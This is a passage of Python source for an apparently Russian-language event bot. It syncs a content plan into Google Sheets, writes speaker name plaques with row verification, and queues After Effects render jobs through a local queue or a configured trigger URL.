        return self.spreadsheet.client.request("PUT", url, {"range": "{}!A1".format(a1_quote_sheet_title(self.title)), "majorDimension": "ROWS", "values": values})

    def batch_update(self, updates, value_input_option="RAW"):
        url = "https://sheets.googleapis.com/v4/spreadsheets/{}/values:batchUpdate".format(urllib.parse.quote(self.spreadsheet.id))
        sheet_prefix = a1_quote_sheet_title(self.title)
        data = []
        for item in updates:
            data.append({"range": "{}!{}".format(sheet_prefix, item["range"]), "values": item.get("values") or []})
        payload = {"valueInputOption": value_input_option, "data": data}
        return self.spreadsheet.client.request("POST", url, payload)


def get_google_client(include_drive=False):
    service_account_json = os.environ.get("GOOGLE_SERVICE_ACCOUNT_JSON", "").strip()
    service_account_file = os.environ.get("GOOGLE_SERVICE_ACCOUNT_FILE", "").strip()
    oauth_user_json = os.environ.get("GOOGLE_OAUTH_USER_JSON", "").strip()
    oauth_user_file = os.environ.get("GOOGLE_OAUTH_USER_FILE", "").strip()
    if not any([service_account_json, service_account_file, oauth_user_json, oauth_user_file]):
        raise ConfigError("Для записи в Google Sheets задайте GOOGLE_SERVICE_ACCOUNT_JSON/FILE или GOOGLE_OAUTH_USER_JSON/FILE.")
    scopes = ["https://www.googleapis.com/auth/spreadsheets"]
    if include_drive:
        scopes.append("https://www.googleapis.com/auth/drive.file")
    try:
        import gspread
        from google.oauth2.credentials import Credentials as UserCredentials
        from google.oauth2.service_account import Credentials
    except ImportError as exc:
        if oauth_user_json or oauth_user_file:
            try:
                info = json.loads(oauth_user_json) if oauth_user_json else json.loads(Path(oauth_user_file).expanduser().read_text(encoding="utf-8"))
            except (OSError, ValueError) as json_exc:
                raise ConfigError("GOOGLE_OAUTH_USER_JSON/FILE не похож на JSON: {}".format(json_exc))
            log("gspread/google-auth недоступны, использую встроенный Google Sheets REST-клиент: {}".format(exc))
            return GoogleOAuthRestClient(info)
        raise ConfigError("Не установлены зависимости для Google Sheets, а stdlib fallback поддерживает только GOOGLE_OAUTH_USER_JSON/FILE. Проверьте requirements.txt на хостинге: {}".format(exc))
    if oauth_user_json:
        try:
            info = json.loads(oauth_user_json)
        except ValueError as exc:
            raise ConfigError("GOOGLE_OAUTH_USER_JSON не похож на JSON: {}".format(exc))
        credentials = UserCredentials.from_authorized_user_info(info, scopes=scopes)
    elif oauth_user_file:
        credentials = UserCredentials.from_authorized_user_file(oauth_user_file, scopes=scopes)
    elif service_account_json:
        try:
            info = json.loads(service_account_json)
        except ValueError as exc:
            raise ConfigError("GOOGLE_SERVICE_ACCOUNT_JSON не похож на JSON: {}".format(exc))
        credentials = Credentials.from_service_account_info(info, scopes=scopes)
    else:
        credentials = Credentials.from_service_account_file(service_account_file, scopes=scopes)
    return gspread.authorize(credentials)


def describe_google_error(exc):
    text = str(exc)
    if "invalid_scope" in text:
        return (
            "OAuth-токен Google был выдан без нужного scope для этой операции.\n"
            "Для обычной записи в существующую таблицу достаточно текущего токена, "
            "но для авто-создания AE-ready таблицы нужно заново получить GOOGLE_OAUTH_USER_JSON "
            "со scope spreadsheets + drive.file, либо заранее задать AE_READY_SPREADSHEET_ID.\n"
            "{}".format(text[:500])
        )
    if "sheets.googleapis.com" in text and ("disabled" in text or "has not been used" in text):
        project_match = re.search(r"project=(\d+)", text)
        project_id = project_match.group(1) if project_match else "ВАШ_PROJECT_ID"
        return (
            "В проекте Google Cloud не включен Google Sheets API.\n"
            "Откройте ссылку из лога Google или включите API здесь:\n"
            "https://console.developers.google.com/apis/api/sheets.googleapis.com/overview?project={}\n"
            "После включения подождите 2-5 минут и перезапустите бота."
        ).format(project_id)
    if "The caller does not have permission" in text or "PERMISSION_DENIED" in text or "403" in text:
        return (
            "У Google-аккаунта бота нет доступа к этой таблице или листу.\n"
            "Проверьте, что таблица расшарена на аккаунт, которым создан GOOGLE_OAUTH_USER_JSON/GOOGLE_SERVICE_ACCOUNT_JSON, с правом редактора.\n"
            "{}".format(text[:500])
        )
    return "Ошибка Google Sheets: {}".format(text[:700])


def run_google_action(label, action):
    try:
        return action()
    except ConfigError:
        raise
    except Exception as exc:
        raise ConfigError("{}: {}".format(label, describe_google_error(exc)))


def ae_ready_state(state):
    data = state.setdefault(AE_READY_STATE_KEY, {})
    if not isinstance(data, dict):
        state[AE_READY_STATE_KEY] = {}
    return state[AE_READY_STATE_KEY]


def spreadsheet_id_from_value(value):
    """Accept either a bare spreadsheet id or a full Google Sheets URL.

    AE_READY_SPREADSHEET_ID is routinely filled in with a copied browser URL, which
    open_by_key() cannot use. ae_sheet_source.py already normalizes this; do the same
    here so both sides agree on which spreadsheet is meant.
    """
    text = str(value or "").strip()
    if not text:
        return ""
    match = re.search(r"/spreadsheets/d/([a-zA-Z0-9-_]+)", urllib.parse.urlparse(text).path)
    if match:
        return match.group(1)
    if text.startswith("http://") or text.startswith("https://"):
        raise ConfigError("Не удалось извлечь ID таблицы из ссылки: {}".format(text))
    return text


def ae_ready_spreadsheet_id(state):
    explicit = os.environ.get("AE_READY_SPREADSHEET_ID", "").strip()
    if explicit:
        return spreadsheet_id_from_value(explicit)
    return spreadsheet_id_from_value(ae_ready_state(state).get("spreadsheet_id"))


def ae_ready_source_url(state):
    saved = str(ae_ready_state(state).get("source_url") or "").strip()
    return saved or AE_READY_SOURCE_URL


def ae_ready_url(spreadsheet_id):
    return ae_content_plan.google_sheet_url(spreadsheet_id) if spreadsheet_id else ""


def ae_status_report(state):
    data = ae_ready_state(state)
    spreadsheet_id = ae_ready_spreadsheet_id(state)
    lines = [
        "AE-ready таблица: {}".format(ae_ready_url(spreadsheet_id) if spreadsheet_id else "еще не создана"),
        "Источник: {}".format(ae_ready_source_url(state)),
        "Последний sync: {}".format(data.get("last_synced_at") or "не было"),
        "Source hash: {}".format(data.get("source_hash") or "нет"),
        "Reference hash: {}".format(data.get("reference_hash") or "нет"),
        "Data hash: {}".format(data.get("data_hash") or "нет"),
        "Сессии: {}".format(data.get("sessions") or 0),
        "Люди: {}".format(data.get("unique_people") or 0),
        "Плашки: {}".format(data.get("badges") or 0),
        "Плашки в МОУШЕН: {} (создано {}, обновлено {}, пропущено {}, ошибок {})".format(
            data.get("motion_synced") or 0,
            data.get("motion_created") or 0,
            data.get("motion_updated") or 0,
            data.get("motion_skipped") or 0,
            len(data.get("motion_errors") or []),
        ),
        "Визитки: {}".format(data.get("cards") or 0),
        "Warnings: {}".format(data.get("warnings_count") or 0),
    ]
    return "\n".join(lines)


def ae_warnings_report(state, limit=12):
    warnings = ae_ready_state(state).get("warnings") or []
    if not warnings:
        return "Warnings нет."
    lines = []
    for index, item in enumerate(warnings[:limit], start=1):
        source = item.get("source_cell") or "общий отчет"
        lines.append("{}. {}: {}".format(index, source, item.get("message", "")))
    if len(warnings) > limit:
        lines.append("Еще warnings: {}".format(len(warnings) - limit))
    return "\n".join(lines)


def figma_setup_report(state):
    spreadsheet_id = ae_ready_spreadsheet_id(state)
    source = ae_ready_url(spreadsheet_id) if spreadsheet_id else "AE-ready таблица еще не создана. Сначала выполните /ae_sync."
    return (
        "Figma-плагин подготовлен в папке figma_plugin проекта.\n\n"
        "1. В Figma импортируйте figma_plugin/manifest.json через Plugins -> Development.\n"
        "2. На текущей странице назовите шаблон TS26/VIZITKA_TEMPLATE.\n"
        "3. В шаблоне назовите слои FIO, POSITION и PHOTO.\n"
        "4. В плагине укажите TSV-ссылку листа content_plan_cards и сначала нажмите проверку.\n"
        "5. После ручной проверки нажмите создание / обновление.\n\n"
        "AE-ready таблица:\n{}\n\n"
        "ФИГМА-токен для первой версии не нужен: плагин работает в открытом вами файле и не передает доступ к Figma на хостинг."
    ).format(source)


def get_or_create_ae_spreadsheet(client, state, rebuild=False):
    spreadsheet_id = "" if rebuild else ae_ready_spreadsheet_id(state)
    if spreadsheet_id:
        return run_google_action("Не удалось открыть AE-ready таблицу", lambda: client.open_by_key(spreadsheet_id))
    drive_client = get_google_client(include_drive=True)
    spreadsheet = run_google_action("Не удалось создать AE-ready таблицу", lambda: drive_client.create(AE_READY_SPREADSHEET_TITLE))
    spreadsheet_id = getattr(spreadsheet, "id", "") or getattr(spreadsheet, "spreadsheet_id", "")
    if not spreadsheet_id:
        raise ConfigError("Google создал таблицу, но не вернул spreadsheet_id.")
    ae_ready_state(state)["spreadsheet_id"] = spreadsheet_id
    share_emails = [item.strip() for item in re.split(r"[,;\s]+", os.environ.get("AE_READY_SHARE_EMAILS", "")) if item.strip()]
    for email in share_emails:
        try:
            spreadsheet.share(email, perm_type="user", role="writer")
        except Exception as exc:
            log("Не удалось расшарить AE-ready таблицу на {}: {}".format(email, exc))
    return spreadsheet


def ensure_worksheet(spreadsheet, title, rows=100, cols=20):
    for worksheet in spreadsheet.worksheets():
        if worksheet.title == title:
            return worksheet
    return spreadsheet.add_worksheet(title=title, rows=max(1, rows), cols=max(1, cols))


def table_values(fieldnames, rows):
    values = [list(fieldnames)]
    for row in rows:
        values.append([sheet_safe_text(row.get(field, "")) for field in fieldnames])
    return values


def write_ae_records_to_spreadsheet(spreadsheet, records):
    for title, fields, key in ae_content_plan.SHEET_TABS:
        rows = records.get(key) or []
        worksheet = run_google_action("Не удалось подготовить лист {}".format(title), lambda title=title, rows=rows, fields=fields: ensure_worksheet(spreadsheet, title, rows=len(rows) + 10, cols=len(fields) + 2))
        values = table_values(fields, rows)
        run_google_action("Не удалось очистить лист {}".format(title), worksheet.clear)
        if values:
            run_google_action("Не удалось записать лист {}".format(title), lambda worksheet=worksheet, values=values: worksheet.update(values, value_input_option="RAW"))


def session_shift_by_day():
    config_path = Path(os.environ.get("AE_RENDER_CONFIG", Path(__file__).resolve().parent / "ae_render_config.json")).expanduser()
    try:
        config = json.loads(config_path.read_text(encoding="utf-8"))
        shifts = config.get("templates", {}).get("session_topic", {}).get("shift_by_day", {})
        active = str(config.get("active_shift") or os.environ.get("AE_ACTIVE_SHIFT", "")).strip()
        if active:
            return {str(day): active for day in shifts if str(day).strip()}
        return shifts
    except (OSError, ValueError) as exc:
        log("Не удалось прочитать карту смен для рендера тем: {}".format(exc))
        return {}


def session_day_number(value):
    match = re.search(r"\d+", str(value or ""))
    return match.group(0) if match else ""


def enqueue_session_topic_renders(records):
    if not AE_RENDER_ENABLED:
        return 0
    session_topics_enabled = os.environ.get("AE_RENDER_SESSION_TOPICS_ENABLED", "false").strip().lower()
    if session_topics_enabled not in {"1", "true", "yes", "y", "on"}:
        return 0
    shifts = session_shift_by_day()
    queued = 0
    for session in records.get("legacy_sessions") or []:
        day = session_day_number(session.get("ДЕНЬ"))
        shift = str(shifts.get(day, "")).strip()
        topic = str(session.get("ТЕМА", "")).strip()
        description = str(session.get("ОПИСАНИЕ", "")).strip()
        if not day or not shift or not topic:
            continue
        source_key = "session:{}:{}:{}:{}".format(day, shift, session.get("ПЛОЩАДКА", ""), session.get("ИСХОДНАЯ_ЯЧЕЙКА", ""))
        try:
            _, created = ae_render_queue.enqueue(
                AE_RENDER_QUEUE_PATH,
                "session_topic",
                {"day": day, "shift": shift, "topic": topic, "description": description, "venue": session.get("ПЛОЩАДКА", "")},
                source_key=source_key,
            )
        except (OSError, ae_render_queue.RenderQueueError) as exc:
            log("Не удалось поставить тему сессии в очередь: {}".format(exc))
            continue
        if created:
            queued += 1
    return queued


def ae_badge_confidence(row):
    try:
        return float(str(row.get("ДОСТОВЕРНОСТЬ") or "0").replace(",", "."))
    except ValueError:
        return 0.0


def ae_badge_ready_for_motion(row):
    return (
        str(row.get("МОУШЕН_ГОТОВО") or "").strip() == "1"
        and normalize_person_name(row.get("ФИО спикера", ""))
        and normalize_space(row.get("Должность", ""))
        and ae_badge_confidence(row) >= AE_READY_PLAQUE_CONFIDENCE_THRESHOLD
    )


def sync_ae_ready_badges_to_motion_sheet(records):
    result = {"enabled": AE_READY_PLAQUE_SYNC_ENABLED, "synced": 0, "created": 0, "updated": 0, "skipped": 0, "errors": []}
    badges = records.get("badges") or []
    if not AE_READY_PLAQUE_SYNC_ENABLED:
        result["skipped"] = len(badges)
        return result
    if not str(PLAQUE_SPREADSHEET_ID or "").strip():
        result["skipped"] = len(badges)
        result["errors"].append("PLAQUE_SPREADSHEET_ID не задан: перенос плашек в МОУШЕН пропущен.")
        return result

    selected = {}
    for badge in badges:
        if not ae_badge_ready_for_motion(badge):
            result["skipped"] += 1
            continue
        key = normalize_person_key(badge.get("ФИО спикера", ""))
        current = selected.get(key)
        if current is None or ae_badge_confidence(badge) > ae_badge_confidence(current):
            if current is not None:
                result["skipped"] += 1
            selected[key] = badge
        else:
            result["skipped"] += 1

    try:
        worksheet = get_plaque_worksheet()
        sheet_values = run_google_action(
            "Не удалось прочитать строки листа для плашек", worksheet.get_all_values
        )
    except (MonitorError, ConfigError) as exc:
        result["errors"].append(str(exc))
        log("AE-ready плашки не перенесены в МОУШЕН: {}".format(exc))
        return result

    for badge in selected.values():
        try:
            name = validate_person_name(badge.get("ФИО спикера", ""))
            position = validate_position(badge.get("Должность", ""))
            write_result = write_plaque_to_sheet(
                name,
                position,
                note_text=AE_READY_PLAQUE_NOTE_TEXT,
                worksheet=worksheet,
                values=sheet_values,
                verify=False,
            )
            while len(sheet_values) < write_result["row"]:
                sheet_values.append([])
            row = sheet_values[write_result["row"] - 1]
            while len(row) < max(PLAQUE_NAME_COL, PLAQUE_POSITION_COL, PLAQUE_NOTE_COL):
                row.append("")
            row[PLAQUE_NAME_COL - 1] = name
            row[PLAQUE_POSITION_COL - 1] = position
            row[PLAQUE_NOTE_COL - 1] = AE_READY_PLAQUE_NOTE_TEXT
        except (MonitorError, ConfigError, ValueError) as exc:
            message = "{}: {}".format(badge.get("ФИО спикера") or "без имени", exc)
            result["errors"].append(message)
            log("AE-ready плашка не перенесена в МОУШЕН: {}".format(message))
            continue
        result["synced"] += 1
        if write_result.get("action") == "created":
            result["created"] += 1
        elif write_result.get("action") == "updated":
            result["updated"] += 1
    return result


def run_ae_ready_sync(args, state, force=False, rebuild=False):
    source_url = ae_ready_source_url(state)
    if not source_url:
        raise ConfigError("AE_READY_SOURCE_URL не задан. Укажите ссылку на исходный Контент-план или отключите AE_READY_SYNC_ENABLED.")
    source_sheet = {"label": "Контент-план", "url": source_url}
    current = fetch_sheet(source_url, args.timeout)
    if str(AE_POSITION_REFERENCE_URL or "").strip():
        reference_sheet = fetch_sheet(AE_POSITION_REFERENCE_URL, args.timeout)
    else:
        reference_sheet = {"hash": "", "cells": [], "rows": 0, "bytes": 0}
    data = ae_ready_state(state)
    if not force and data.get("source_hash") == current["hash"] and data.get("reference_hash") == reference_sheet["hash"]:
        return {"changed": False, "message": "AE-ready таблица уже актуальна.", "spreadsheet_id": ae_ready_spreadsheet_id(state)}
    position_reference = position_reference_from_sheet(reference_sheet) if str(AE_POSITION_REFERENCE_URL or "").strip() else {}
    corrector = build_ae_llm_corrector(args)
    records = ae_content_plan.build_records(
        current["cells"],
        corrector=corrector,
        confidence_threshold=AE_READY_CONFIDENCE_THRESHOLD,
        position_reference=position_reference,
    )
    data_hash = ae_content_plan.records_hash(records)
    client = get_google_client(include_drive=False)
    spreadsheet = get_or_create_ae_spreadsheet(client, state, rebuild=rebuild)
    write_ae_records_to_spreadsheet(spreadsheet, records)
    motion_sync = sync_ae_ready_badges_to_motion_sheet(records)
    queued_session_topics = enqueue_session_topic_renders(records)
    spreadsheet_id = getattr(spreadsheet, "id", "") or ae_ready_spreadsheet_id(state)
    report = records.get("report") or {}
    data.update({
        "spreadsheet_id": spreadsheet_id,
        "source_url": source_sheet["url"],
        "source_hash": current["hash"],
        "reference_hash": reference_sheet["hash"],
        "data_hash": data_hash,
        "last_synced_at": now_text(),
        "sessions": report.get("sessions_found", 0),
        "unique_people": report.get("unique_people", 0),
        "badges": report.get("badges", 0),
        "cards": report.get("cards", 0),
        "warnings_count": len(records.get("warnings") or []),
        "warnings": records.get("warnings") or [],
        "motion_synced": motion_sync["synced"],
        "motion_created": motion_sync["created"],
        "motion_updated": motion_sync["updated"],
        "motion_skipped": motion_sync["skipped"],
        "motion_errors": motion_sync["errors"][:10],
    })
    return {
        "changed": True,
        "spreadsheet_id": spreadsheet_id,
        "queued_session_topics": queued_session_topics,
        "message": "AE-ready обновлена: сессий {}, людей {}, плашек {}, визиток {}, warnings {}, в МОУШЕН {}, тем поставлено в рендер {}.".format(
            data["sessions"],
            data["unique_people"],
            data["badges"],
            data["cards"],
            data["warnings_count"],
            data["motion_synced"],
            queued_session_topics,
        ),
    }


def maybe_hourly_ae_ready_sync(args, sheets, state, moment=None):
    if env_bool("AE_READY_SYNC_ENABLED", True) is False:
        return False
    current_hour = content_plan_hour_key(moment)
    data = ae_ready_state(state)
    if data.get("last_auto_sync_hour") == current_hour:
        return False
    try:
        result = run_ae_ready_sync(args, state, force=False, rebuild=False)
        data["last_auto_sync_hour"] = current_hour
        if result.get("changed"):
            for admin_id in admin_chat_ids():
                send_plain_chat_message(args, admin_id, "TS26: AE-ready обновлена", "{}\n{}".format(result["message"], ae_ready_url(result.get("spreadsheet_id"))))
        return True
    except (MonitorError, ConfigError, ValueError, ae_content_plan.AEContentPlanError) as exc:
        data["last_auto_sync_hour"] = current_hour
        data["last_error"] = str(exc)
        log("AE-ready hourly sync не выполнен: {}".format(exc))
        return True


def get_plaque_worksheet():
    if not str(PLAQUE_SPREADSHEET_ID or "").strip():
        raise ConfigError("PLAQUE_SPREADSHEET_ID не задан.")
    client = get_google_client()
    spreadsheet = run_google_action("Не удалось открыть таблицу для плашек", lambda: client.open_by_key(PLAQUE_SPREADSHEET_ID))
    worksheets = run_google_action("Не удалось получить список листов", spreadsheet.worksheets)
    for worksheet in worksheets:
        if worksheet.id == PLAQUE_WORKSHEET_GID:
            return worksheet
    raise ConfigError("Не найден лист с gid={}".format(PLAQUE_WORKSHEET_GID))


def plaque_row_url(row_index):
    return "https://docs.google.com/spreadsheets/d/{}/edit?gid={}&range=A{}:E{}".format(
        PLAQUE_SPREADSHEET_ID,
        PLAQUE_WORKSHEET_GID,
        row_index,
        row_index,
    )


def plaque_cell_from_row(row, col_index):
    return row[col_index - 1] if len(row) >= col_index else ""


def verify_plaque_row(worksheet, row_index, name, position, note_text=PLAQUE_NOTE_TEXT):
    row = run_google_action("Не удалось проверить записанную строку", lambda: worksheet.row_values(row_index))
    actual_name = normalize_space(plaque_cell_from_row(row, PLAQUE_NAME_COL))
    actual_position = normalize_space(plaque_cell_from_row(row, PLAQUE_POSITION_COL))
    actual_note = normalize_space(plaque_cell_from_row(row, PLAQUE_NOTE_COL))
    expected_note = normalize_space(note_text)
    if actual_name != normalize_space(name) or actual_position != normalize_space(position) or actual_note != expected_note:
        raise ConfigError(
            "Google Sheets принял запрос, но проверка строки не совпала.\n"
            "Строка: {}\n"
            "Ожидалось: A='{}', B='{}', E='{}'\n"
            "Прочитано: A='{}', B='{}', E='{}'\n"
            "{}".format(
                row_index,
                name,
                position,
                note_text,
                actual_name or "пусто",
                actual_position or "пусто",
                actual_note or "пусто",
                plaque_row_url(row_index),
            )
        )
    return {"name": actual_name, "position": actual_position, "note": actual_note}


def find_plaque_row(values, name):
    wanted = normalize_person_key(name)
    first_empty = None
    for offset, row in enumerate(values[PLAQUE_START_ROW - 1 :], start=PLAQUE_START_ROW):
        current_name = row[PLAQUE_NAME_COL - 1] if len(row) >= PLAQUE_NAME_COL else ""
        current_position = row[PLAQUE_POSITION_COL - 1] if len(row) >= PLAQUE_POSITION_COL else ""
        if normalize_person_key(current_name) == wanted:
            return offset, "updated"
        if first_empty is None and not normalize_space(current_name) and not normalize_space(current_position):
            first_empty = offset
    if first_empty is not None:
        return first_empty, "created"
    return max(PLAQUE_START_ROW, len(values) + 1), "created"


def column_letter(index):
    if index < 1:
        raise ConfigError("Номер колонки должен быть больше 0.")
    letters = ""
    while index:
        index, remainder = divmod(index - 1, 26)
        letters = chr(65 + remainder) + letters
    return letters


def write_plaque_to_sheet(name, position, note_text=PLAQUE_NOTE_TEXT, worksheet=None, values=None, verify=True):
    worksheet = worksheet or get_plaque_worksheet()
    values = values if values is not None else run_google_action(
        "Не удалось прочитать строки листа для плашек", worksheet.get_all_values
    )
    row_index, action = find_plaque_row(values, name)
    updates = [
        {"range": "{}{}".format(column_letter(PLAQUE_NAME_COL), row_index), "values": [[sheet_safe_text(name)]]},
        {"range": "{}{}".format(column_letter(PLAQUE_POSITION_COL), row_index), "values": [[sheet_safe_text(position)]]},
        {"range": "{}{}".format(column_letter(PLAQUE_NOTE_COL), row_index), "values": [[sheet_safe_text(note_text)]]},
    ]
    log("Запись плашки: spreadsheet={}, worksheet='{}' gid={}, row={}, action={}, name='{}'".format(
        PLAQUE_SPREADSHEET_ID,
        getattr(worksheet, "title", ""),
        getattr(worksheet, "id", ""),
        row_index,
        action,
        name,
    ))
    run_google_action("Не удалось записать плашку в Google Sheets", lambda: worksheet.batch_update(updates, value_input_option="RAW"))
    verified = (
        verify_plaque_row(worksheet, row_index, name, position, note_text=note_text)
        if verify
        else {"name": name, "position": position, "note": note_text}
    )
    return {
        "row": row_index,
        "action": action,
        "worksheet_title": getattr(worksheet, "title", "") or PLAQUE_WORKSHEET_TITLE,
        "worksheet_gid": getattr(worksheet, "id", PLAQUE_WORKSHEET_GID),
        "url": plaque_row_url(row_index),
        "verified": verified,
    }


def enqueue_plaque_render(name, position, result, requested_by=""):
    if not AE_RENDER_ENABLED:
        return {"status": "disabled"}
    content_key = hashlib.sha256("{}\x1f{}".format(name, position).encode("utf-8")).hexdigest()[:16]
    source_key = "plaque:{}:{}:{}".format(result["worksheet_gid"], result["row"], content_key)
    if AE_RENDER_TRIGGER_URL:
        payload = {
            "kind": "plaque",
            "name": name,
            "position": position,
            "sheet_row": result["row"],
            "source_key": source_key,
            # Lets the worker report the render outcome back to whoever asked for it.
            "requested_by": str(requested_by or ""),
        }
        body = json.dumps(payload, ensure_ascii=False).encode("utf-8")
        request = urllib.request.Request(
            AE_RENDER_TRIGGER_URL,
            data=body,
            headers={"Content-Type": "application/json; charset=utf-8"},
            method="POST",
        )
        if AE_RENDER_TRIGGER_TOKEN:
            request.add_header("Authorization", "Bearer " + AE_RENDER_TRIGGER_TOKEN)
        try:
            with urllib.request.urlopen(request, timeout=8) as response:
                data = json.loads(response.read().decode("utf-8"))
            if data.get("ok"):
                return {
                    "status": data.get("status") or "queued",
                    "job": {"id": data.get("job_id", ""), "status": data.get("job_status", "")},
                    "queue_ahead": int(data.get("queue_ahead") or 0),
                    "queued_total": int(data.get("queued_total") or 0),
                    "preparing_total": int(data.get("preparing_total") or 0),
                    "rendering_total": int(data.get("rendering_total") or 0),
                    "renderer_busy": bool(data.get("renderer_busy")),
                }
            return {"status": "error", "error": data.get("error", "trigger rejected")}
        except urllib.error.HTTPError as exc:
            try:
                body = exc.read().decode("utf-8", errors="replace")
                data = json.loads(body)
                error = data.get("error") or body
                log("AE render trigger отклонил плашку: HTTP {}: {}".format(exc.code, error))
                return {"status": "error", "error": error, "code": data.get("code", "")}
            except (OSError, ValueError):
                log("Не удалось вызвать AE render trigger: HTTP {}".format(exc.code))
                return {"status": "error", "error": "HTTP {}".format(exc.code)}
        except Exception as exc:
            log("Не удалось вызвать AE render trigger: {}".format(exc))
            return {"status": "error", "error": str(exc)}
    try:
        job, created = ae_render_queue.enqueue(
            AE_RENDER_QUEUE_PATH,
            "plaque",
            {
                "name": name,
                "position": position,
                "sheet_row": result["row"],
                "requested_by": str(requested_by or ""),
            },
            source_key=source_key,
            dedupe_statuses=ae_render_queue.USER_RETRY_DEDUPE_STATUSES,
        )
        render = {"status": "queued" if created else "existing", "job": job}
        render.update(local_render_queue_status(job.get("id")))
        return render
    except (OSError, ae_render_queue.RenderQueueError) as exc:
        log("Не удалось поставить плашку в очередь: {}".format(exc))
        return {"status": "error", "error": str(exc)}


def render_queue_report():
    """Operator-facing summary of the local render queue."""
    try:
        counts, failures = ae_render_queue.queue_counts(AE_RENDER_QUEUE_PATH)
    except Exception as exc:  # noqa: BLE001 - report instead of crashing the command
        return "Не удалось прочитать очередь рендера: {}".format(exc)
    lines = [
        "Очередь: {}".format(AE_RENDER_QUEUE_PATH),
        "Ждут: {} · Готовятся: {} · Рендерятся: {}".format(
            counts.get("queued", 0), counts.get("preparing", 0), counts.get("rendering", 0)
        ),
        "Готово: {} · Ошибок: {} · Отменено: {}".format(
            counts.get("done", 0), counts.get("error", 0), counts.get("cancelled", 0)
        ),
    ]
    if AE_RENDER_TRIGGER_URL:
        lines.append("Триггер: {}".format(AE_RENDER_TRIGGER_URL))
    else:
        lines.append("Триггер не настроен: бот пишет в файл очереди, воркер заберёт задание при следующем опросе.")
    if failures:
        lines.append("")
        lines.append("Последние ошибки:")
        for job in failures[:5]:
            payload = job.get("payload") or {}
            lines.append("• {} — {}".format(payload.get("name", "") or job.get("kind", ""), str(job.get("error", ""))[:160]))
        lines.append("")
        lines.append("Повторить все неудачные: /render_retry")
    return "\n".join(lines)


def local_render_queue_status(job_id):
    try:
        data = ae_render_queue.load_queue_unlocked(AE_RENDER_QUEUE_PATH)
    except Exception:
        return {}
    active_statuses = {"queued", "preparing", "rendering"}
    ahead = 0
    found = None
    counts = {}
    for job in data.get("jobs", []):
        status = job.get("status", "")
        counts[status] = counts.get(status, 0) + 1
        if job.get("id") == job_id:
            found = job
            continue
        if found is None and status in active_statuses:
            ahead += 1
    if not found:
        return {}
    return {
        "queue_ahead": ahead if found.get("status") in active_statuses else 0,
        "queued_total": counts.get("queued", 0),
        "preparing_total": counts.get("preparing", 0),
        "rendering_total": counts.get("rendering", 0),
    }


def plural_ru(number, one, few, many):
    number = abs(int(number))
    if number % 100 in range(11, 15):
        return many
    if number % 10 == 1:
        return one
    if number % 10 in range(2, 5):
        return few
    return many


def plaque_render_message(render):
    status = render.get("status") if isinstance(render, dict) else "error"
    job = render.get("job") if isinstance(render.get("job"), dict) else {}
    job_status = str(job.get("status") or render.get("job_status") or "").strip()
    ahead = int(render.get("queue_ahead") or 0)
    active_total = int(render.get("preparing_total") or 0) + int(render.get("rendering_total") or 0)
    busy = bool(render.get("renderer_busy") or active_total)
    if status == "queued":
        if ahead > 0 or busy:
            word = plural_ru(ahead, "задание", "задания", "заданий")
            if ahead > 0:
                return "Рендер поставлен в очередь: перед ним {} {}. Файл появится автоматически, когда очередь дойдет до плашки.".format(ahead, word)
            return "Рендер поставлен в очередь. Сейчас After Effects занят другим рендером, плашка начнется после него."
        return "Рендер запускается сейчас. Обычно плашка готова быстро."
    if status == "existing":
        if job_status == "done":
            return "Рендер этой плашки уже был выполнен."
        if ahead > 0:
            word = plural_ru(ahead, "задание", "задания", "заданий")
            return "Рендер уже был в очереди: перед ним {} {}.".format(ahead, word)
        return "Рендер уже был в очереди и скоро начнется."
    if status == "disabled":
        return "Автоматический рендер отключен."
    if render.get("code") == "wrong_project" or "Откройте в After Effects проект" in str(render.get("error") or ""):
        return "Рендер не поставлен. Переключитесь в After Effects на проект для плашек и повторите действие."
    return "Плашка сохранена, но рендер не поставлен в очередь."


def confirm_plaque(args, state, chat_id):
    session = plaque_session(state, chat_id)
    entries = session.get("entries")
    if isinstance(entries, list) and entries:
        results = []
        failures = []
        for entry in entries:
            # Isolate each row: a failure on row 7 must not hide that rows 1-6 were
            # already written, otherwise the user re-sends everything and duplicates.
            try:
                result = write_plaque_to_sheet(entry["name"], entry["position"])
            except (MonitorError, ConfigError) as exc:
                log("Плашка не записана: {} — {}".format(entry["name"], exc))
                failures.append({"entry": entry, "error": str(exc)})
                continue
            render = enqueue_plaque_render(entry["name"], entry["position"], result, requested_by=chat_id)
            results.append({"entry": entry, "result": result, "render": render})
        clear_plaque_session(state, chat_id)
        created_count = sum(1 for item in results if item["result"]["action"] == "created")
        updated_count = sum(1 for item in results if item["result"]["action"] == "updated")
        public_lines = [
            "Плашки отправлены в таблицу." if results else "Ни одна плашка не записана.",
            "Добавлено: {}. Обновлено: {}. Ошибок: {}.".format(created_count, updated_count, len(failures)),
            "",
        ]
        for index, item in enumerate(results, start=1):
            action_text = "обновлена" if item["result"]["action"] == "updated" else "добавлена"
            entry = item["entry"]
            render_text = " " + plaque_render_message(item.get("render", {}))
            public_lines.append("{}. {}: {} — {}.{}".format(index, action_text.capitalize(), entry["name"], entry["position"], render_text))
        for item in failures:
            public_lines.append("Не записана: {} — {}. Причина: {}".format(item["entry"]["name"], item["entry"]["position"], item["error"]))
        admin_lines = [
            "Пакетная отправка плашек",
            "Итог: добавлено {}, обновлено {}, ошибок {}.".format(created_count, updated_count, len(failures)),
            "",
        ]
        for index, item in enumerate(results, start=1):
            action_text = "обновлена" if item["result"]["action"] == "updated" else "добавлена"
            entry = item["entry"]
            result = item["result"]
            admin_lines.append(
                "{}. {}: {} — {}\nСтрока {} · {}\n{}".format(
                    index,
                    action_text.capitalize(),
                    entry["name"],
                    entry["position"],
                    result["row"],
                    result["worksheet_title"],
                    result["url"],
                )
            )
        for item in failures:
            admin_lines.append("ОШИБКА: {} — {}\n{}".format(item["entry"]["name"], item["entry"]["position"], item["error"]))
        send_plain_chat_message(args, chat_id, "TS26: готово", "\n".join(public_lines), reply_markup=plaque_reply_keyboard())
        for admin_id in admin_chat_ids():
            try:
                send_plain_chat_message(args, admin_id, "TS26: плашки через бот", "\n\n".join(admin_lines))
            except (MonitorError, ConfigError) as exc:
                log("Не удалось уведомить админа о пакетных плашках: {}".format(exc))
        return
    name = session.get("name")
    position = session.get("position")
    if not name or not position:
        ask_plaque_name(args, state, chat_id)
        return
    result = write_plaque_to_sheet(name, position)
    render = enqueue_plaque_render(name, position, result, requested_by=chat_id)
    clear_plaque_session(state, chat_id)
    action_text = "обновлена" if result["action"] == "updated" else "добавлена"
    render_message = plaque_render_message(render)
    public_message = "Плашка {}.\nФИО: {}\nДолжность: {}\n{}".format(action_text, name, position, render_message)
